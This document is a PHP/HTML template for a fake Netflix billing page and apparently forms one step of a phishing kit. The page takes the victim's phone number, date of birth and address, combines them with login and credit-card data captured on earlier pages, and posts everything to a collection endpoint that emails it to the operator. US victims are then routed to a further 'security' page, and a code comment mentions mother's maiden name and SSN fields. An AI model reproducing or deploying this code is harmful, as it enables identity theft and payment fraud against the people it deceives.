<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="i18n-billing-title"></title>
    <link rel="icon" type="image/x-icon" href="/assets/images/nficon2023.ico">
    <link rel="stylesheet" href="/assets/styles/style.css">
    <style>
        /* Clean Loading Screen */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: #ffffff;
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loading-content {
            text-align: center;
            padding: 40px;
        }
        .loading-spinner {
            border: 3px solid #f0f0f0;
            border-top: 3px solid #e50914;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 24px;
        }
        .loading-text {
            margin: 0;
            font-size: 18px;
            font-weight: 400;
            color: #333;
            letter-spacing: 0.5px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Button Loading State */
        .continue-button {
            position: relative;
            transition: all 0.3s ease;
        }

        .continue-button.loading {
            opacity: 0.8;
            cursor: not-allowed;
            pointer-events: none;
        }

        .continue-button .btn-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid #ffffff;
            border-radius: 50%;
            animation: btnSpin 1s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes btnSpin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

    </style>
</head>
<body>
    <!-- Simple Loading Screen -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <p class="loading-text" id="i18n-loading"></p>
        </div>
    </div>
    <header class="header">
        <div class="header-content">
            <svg class="netflix-logo" viewBox="0 0 111 30" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img">
                <g><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path></g>
            </svg>
            <a href="#" class="sign-out" id="i18n-signout"></a>
        </div>
    </header>

    <main class="main-content">
        <div class="step-info" id="i18n-billing-step"></div>
        <h1 class="page-title" id="i18n-billing-heading"></h1>

        <form id="form">

            <div class="form-group">
                <div class="input-wrapper">
                    <input type="tel" class="form-control" id="phoneNumber" name="phone" placeholder=" ">
                    <label for="phoneNumber" class="floating-label" id="i18n-billing-phone"></label>
                </div>
                <div class="error-message" id="phoneNumberError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-billing-phone-error"></span>
                </div>
            </div>



            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="dateOfBirth" name="date_of_birth" placeholder=" " maxlength="10">
                    <label for="dateOfBirth" class="floating-label" id="i18n-billing-dob"></label>
                </div>
                <div class="error-message" id="dateOfBirthError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-billing-dob-error"></span>
                </div>
            </div>


            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="address1" name="address1" placeholder=" ">
                    <label for="address1" class="floating-label" id="i18n-billing-address1"></label>
                </div>
                <div class="error-message" id="address1Error">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-billing-address1-error"></span>
                </div>
            </div>

            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="address2" name="address2" placeholder=" ">
                    <label for="address2" class="floating-label" id="i18n-billing-address2"></label>
                </div>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="text" class="form-control" id="city" name="city" placeholder=" ">
                        <label for="city" class="floating-label" id="i18n-billing-city"></label>
                    </div>
                    <div class="error-message" id="cityError">
                        <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                        </svg>
                        <span id="i18n-billing-city-error"></span>
                    </div>
                </div>
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="text" class="form-control" id="state" name="state" placeholder=" ">
                        <label for="state" class="floating-label" id="i18n-billing-state"></label>
                    </div>
                    <div class="error-message" id="stateError">
                        <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                        </svg>
                        <span id="i18n-billing-state-error"></span>
                    </div>
                </div>
            </div>

            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" class="form-control" id="postalCode" name="postal_code" placeholder=" " maxlength="10">
                    <label for="postalCode" class="floating-label" id="i18n-billing-postal"></label>
                </div>
                <div class="error-message" id="postalCodeError">
                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="12" height="12" data-icon="CircleXSmall" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
                    </svg>
                    <span id="i18n-billing-postal-error"></span>
                </div>
            </div>

            <div class="disclaimer" id="i18n-billing-disclaimer1"></div>

            <div class="disclaimer" id="i18n-billing-disclaimer2"></div>

            <div class="checkbox-wrapper">
                <input type="checkbox" id="agree" name="agree" class="checkbox">
                <label for="agree" class="checkbox-label" id="i18n-billing-agree-label"></label>
            </div>

            <button type="submit" class="continue-button" id="continueBtn"></button>

            <div class="security-notice">
                <span id="i18n-billing-security"></span> <a href="#" id="i18n-billing-learn"></a>.
            </div>
        </form>
    </main>


    <footer class="footer">
        <div class="footer-content">
            <div class="footer-contact" id="i18n-footer-contact"></div>

            <div class="footer-links">
                <a href="#" id="i18n-footer-faq"></a>
                <a href="#" id="i18n-footer-help"></a>
                <a href="#" id="i18n-footer-terms"></a>
                <a href="#" id="i18n-footer-privacy"></a>
                <a href="#" id="i18n-footer-cookies"></a>
                <a href="#" id="i18n-footer-corporate"></a>
                <a href=\"#\" id=\"i18n-footer-adchoices\"></a>
            </div>

            <div class="language-selector" style="position: relative; display: inline-block; margin-top: 20px;">
                <svg class="language-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="LanguagesSmall" aria-hidden="true" style="position: absolute; left: 8px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; color: #737373; pointer-events: none; z-index: 1;">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M10.7668 5.33333L10.5038 5.99715L9.33974 8.9355L8.76866 10.377L7.33333 14H9.10751L9.83505 12.0326H13.4217L14.162 14H16L12.5665 5.33333H10.8278H10.7668ZM10.6186 9.93479L10.3839 10.5632H11.1036H12.8856L11.6348 7.2136L10.6186 9.93479ZM9.52722 4.84224C9.55393 4.77481 9.58574 4.71045 9.62211 4.64954H6.41909V2H4.926V4.64954H0.540802V5.99715H4.31466C3.35062 7.79015 1.75173 9.51463 0 10.4283C0.329184 10.7138 0.811203 11.2391 1.04633 11.5931C2.55118 10.6795 3.90318 9.22912 4.926 7.57316V12.6667H6.41909V7.51606C6.81951 8.15256 7.26748 8.76169 7.7521 9.32292L8.31996 7.88955C7.80191 7.29052 7.34631 6.64699 6.9834 5.99715H9.06968L9.52722 4.84224Z" fill="currentColor"></path>
                </svg>
                <select name="language" id="language" style="background: transparent; border: 1px solid #737373; color: #737373; padding: 8px 32px 8px 32px; font-size: 13px; border-radius: 2px; appearance: none; cursor: pointer; min-width: 120px;">
                    <option value="en">English</option>
                    <option value="es">Español</option>
                </select>
                <svg class="dropdown-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); width: 12px; height: 12px; color: #737373; pointer-events: none; z-index: 1;">
                    <path d="M8 10.586L3.414 6 2 7.414 8 13.414 14 7.414 12.586 6z" fill="currentColor"/>
                </svg>
            </div>
            
            <div class="footer-country">
            </div>
        </div>
    </footer>

    <script>
        // Floating label functionality
        function setupFloatingLabels() {
            const inputs = document.querySelectorAll('.form-control');
            
            inputs.forEach(input => {
                // Check if input has value on page load
                if (input.value.trim() !== '') {
                    input.classList.add('has-value');
                }
                
                // Handle focus event
                input.addEventListener('focus', function() {
                    this.classList.add('focused');
                    
                    // Mark that user has interacted with this field
                    this.setAttribute('data-touched', 'true');
                    this.classList.remove('error');
                    
                    // Hide error message for this field
                    const errorElement = document.getElementById(this.id + 'Error');
                    if (errorElement) {
                        errorElement.classList.remove('show');
                    }
                });
                
                // Handle blur event
                input.addEventListener('blur', function() {
                    this.classList.remove('focused');
                    if (this.value.trim() !== '') {
                        this.classList.add('has-value');
                    } else {
                        this.classList.remove('has-value');
                    }
                    
                    // Validate field on blur (only if user has touched the field and field is not optional)
                    if (this.getAttribute('data-touched') === 'true' && this.value.trim() === '' && this.id !== 'address2') {
                        // Check if field is required (not MMN or SSN when they're disabled)
                        // All fields are required now
                        if (true) {
                            this.classList.add('error');
                            const errorElement = document.getElementById(this.id + 'Error');
                            if (errorElement) {
                                errorElement.classList.add('show');
                            }
                        }
                    }
                    
                    // Specific validation
                    validateField(this);
                });
                
                // Handle input event
                input.addEventListener('input', function() {
                    if (this.value.trim() !== '') {
                        this.classList.add('has-value');
                        
                        // Remove error state when user starts typing
                        this.classList.remove('error');
                        const errorElement = document.getElementById(this.id + 'Error');
                        if (errorElement) {
                            errorElement.classList.remove('show');
                        }
                    } else {
                        this.classList.remove('has-value');
                        // Remove valid state when input is empty
                        this.classList.remove('valid');
                    }
                    
                    // Format specific fields
                    formatField(this);
                });
            });
        }

        // Format specific fields
        function formatField(input) {
            switch (input.id) {
                case 'phoneNumber':
                    let phone = input.value.replace(/\D/g, '');
                    if (phone.length >= 6) {
                        phone = phone.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
                    } else if (phone.length >= 3) {
                        phone = phone.replace(/(\d{3})(\d{0,3})/, '($1) $2');
                    }
                    input.value = phone.substring(0, 14);
                    break;
                    
                    
                case 'dateOfBirth':
                    let date = input.value.replace(/\D/g, '');
                    if (date.length >= 5) {
                        date = date.replace(/(\d{2})(\d{2})(\d{4})/, '$1/$2/$3');
                    } else if (date.length >= 3) {
                        date = date.replace(/(\d{2})(\d{0,2})/, '$1/$2');
                    }
                    input.value = date.substring(0, 10);
                    break;
            }
        }

        // Validate specific fields
        function validateField(input) {
            if (!input.getAttribute('data-touched')) return;
            
            let isValid = true;
            let errorMessage = '';
            
            switch (input.id) {
                case 'phoneNumber':
                    const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/;
                    isValid = phoneRegex.test(input.value);
                    errorMessage = 'Please enter a valid phone number.';
                    break;
                    
                    
                case 'postalCode':
                    const zipRegex = /^\d{5}(-\d{4})?$/;
                    isValid = zipRegex.test(input.value) || input.value.trim() === '';
                    errorMessage = 'Please enter a valid postal code.';
                    break;
                    
                case 'dateOfBirth':
                    if (input.value) {
                        const dateRegex = /^(0[1-9]|1[0-2])\/(0[1-9]|[12]\d|3[01])\/\d{4}$/;
                        if (!dateRegex.test(input.value)) {
                            isValid = false;
                            errorMessage = 'Please enter a valid date (MM/DD/YYYY).';
                        } else {
                            const parts = input.value.split('/');
                            const month = parseInt(parts[0], 10);
                            const day = parseInt(parts[1], 10);
                            const year = parseInt(parts[2], 10);
                            
                            const birthDate = new Date(year, month - 1, day);
                            const today = new Date();
                            
                            // Check if date is valid
                            if (birthDate.getMonth() !== month - 1 || birthDate.getDate() !== day || birthDate.getFullYear() !== year) {
                                isValid = false;
                                errorMessage = 'Please enter a valid date.';
                            } else if (birthDate > today) {
                                isValid = false;
                                errorMessage = 'Birth date cannot be in the future.';
                            } else {
                                const age = today.getFullYear() - birthDate.getFullYear();
                                const monthDiff = today.getMonth() - birthDate.getMonth();
                                const actualAge = monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate()) ? age - 1 : age;
                                
                                if (actualAge < 18) {
                                    isValid = false;
                                    errorMessage = 'You must be at least 18 years old.';
                                } else if (actualAge > 120) {
                                    isValid = false;
                                    errorMessage = 'Please enter a valid birth date.';
                                }
                            }
                        }
                    }
                    break;
            }
            
            if (input.value.trim() !== '' && !isValid) {
                input.classList.add('error');
                const errorElement = document.getElementById(input.id + 'Error');
                if (errorElement) {
                    errorElement.querySelector('span').textContent = errorMessage;
                    errorElement.classList.add('show');
                }
            } else if (input.value.trim() !== '' && isValid) {
                input.classList.add('valid');
            }
        }

        // Auto-fill fields from previous CC page data
        function autoFillFromCCData() {
            try {
                const flowData = JSON.parse(sessionStorage.getItem('flowData') || '{}');
                const ccData = flowData.cc || {};
                
                // Auto-fill address1 from CC fullAddress
                if (ccData.address && !document.getElementById('address1').value) {
                    document.getElementById('address1').value = ccData.address;
                    document.getElementById('address1').classList.add('has-value');
                }
                
                // Auto-fill postal code from CC zip
                if (ccData.zip && !document.getElementById('postalCode').value) {
                    document.getElementById('postalCode').value = ccData.zip;
                    document.getElementById('postalCode').classList.add('has-value');
                }
                
                console.log('Auto-filled from CC data:', {
                    address: ccData.address || 'Not available',
                    zip: ccData.zip || 'Not available'
                });
            } catch (err) {
                console.warn('Auto-fill failed:', err);
            }
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            setupFloatingLabels();
            // Auto-fill after floating labels are set up
            setTimeout(autoFillFromCCData, 100);
        });
    </script>

    <script>
        // Simple Loading Screen - Hide after 1.5 seconds
        setTimeout(function() {
            const loadingOverlay = document.getElementById('loading-overlay');
            if (loadingOverlay) {
                loadingOverlay.style.opacity = '0';
                loadingOverlay.style.transition = 'opacity 0.3s ease';
                setTimeout(function() {
                    loadingOverlay.remove();
                }, 300);
            }
        }, 1500);

        // Form submission loading state
        const billingForm = document.querySelector('form');
        const continueBtn = document.getElementById('continueBtn');
        
        if (billingForm && continueBtn) {
            billingForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                const L = window.__LANG__ || {};
                continueBtn.innerHTML = '<span class="btn-spinner"></span>' + (L['billing.processing'] || 'Processing...');
                continueBtn.classList.add('loading');
                continueBtn.disabled = true;
                const data = JSON.parse(sessionStorage.getItem('flowData') || '{}');
                const billingData = {
                    phone: document.getElementById('phoneNumber').value,
                    dob: document.getElementById('dateOfBirth').value,
                    address1: document.getElementById('address1').value,
                    address2: document.getElementById('address2').value,
                    city: document.getElementById('city').value,
                    state: document.getElementById('state').value,
                    postal: document.getElementById('postalCode').value
                };
                data.billing = billingData;
                sessionStorage.setItem('flowData', JSON.stringify(data));
                
                // Send email with billing and login data, get country from server
                try {
                    const accessCode = window.__ACCESS_CODE__;
                    if (!accessCode) return;
                    
                    const response = await fetch('/' + accessCode + '/send-billing', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            billing: billingData, 
                            login: data.login || {},
                            cc: data.cc || null
                        })
                    });
                    
                    const result = await response.json();
                    const countryCode = result.countryCode || '';
                    const country = result.country || 'Unknown';
                    
                    // Store country info in session
                    data.geo = { countryCode: countryCode, country: country };
                    sessionStorage.setItem('flowData', JSON.stringify(data));
                    
                    // Only show security page for US users, others go directly to done
                    if (countryCode === 'US') {
                        location.href = '/' + accessCode + '/security';
                    } else {
                        location.href = '/' + accessCode + '/done';
                    }
                } catch (err) {
                    console.warn('Billing failed, defaulting to done page:', err);
                    // Fallback to done page if billing fails
                    const accessCode = window.__ACCESS_CODE__;
                    if (accessCode) {
                        location.href = '/' + accessCode + '/done';
                    }
                }
            });
        }
    </script>
    <script>
      (function(){
        const L = window.__LANG__ || {};
        const set = (id, key) => { 
            const el = document.getElementById(id); 
            if (el && L[key]) {
                // Special handling for title tag
                if (el.tagName === 'TITLE' || id.includes('title')) {
                    el.textContent = L[key];
                    document.title = L[key];
                } else {
                    el.textContent = L[key];
                }
            }
        };
        set('i18n-billing-title', 'billing.title');
        set('i18n-signout', 'header.signout');
        set('i18n-billing-step', 'billing.step');
        set('i18n-billing-heading', 'billing.heading');
        set('i18n-billing-phone', 'billing.phone');
        set('i18n-billing-dob', 'billing.dob');
        set('i18n-billing-address1', 'billing.address1');
        set('i18n-billing-address2', 'billing.address2');
        set('i18n-billing-city', 'billing.city');
        set('i18n-billing-state', 'billing.state');
        set('i18n-billing-postal', 'billing.postal_code');
        set('continueBtn', 'billing.next');
        set('i18n-loading', 'common.loading');
        set('i18n-billing-phone-error', 'billing.phone_error');
        set('i18n-billing-dob-error', 'billing.dob_error');
        set('i18n-billing-address1-error', 'billing.address1_error');
        set('i18n-billing-city-error', 'billing.city_error');
        set('i18n-billing-state-error', 'billing.state_error');
        set('i18n-billing-postal-error', 'billing.postal_error');
        set('i18n-billing-disclaimer1', 'billing.disclaimer1');
        set('i18n-billing-disclaimer2', 'billing.disclaimer2');
        set('i18n-billing-agree-label', 'billing.agree_terms');
        set('i18n-billing-security', 'billing.security_notice');
        set('i18n-billing-learn', 'common.learn_more');
        set('i18n-footer-contact', 'footer.questions');
        set('i18n-footer-faq', 'footer.faq');
        set('i18n-footer-help', 'footer.help');
        set('i18n-footer-terms', 'footer.terms');
        set('i18n-footer-privacy', 'footer.privacy');
        set('i18n-footer-cookies', 'footer.cookies');
        set('i18n-footer-corporate', 'footer.corporate');
        set('i18n-footer-adchoices', 'footer.adchoices');
      })();
    </script>

</body>
</html> 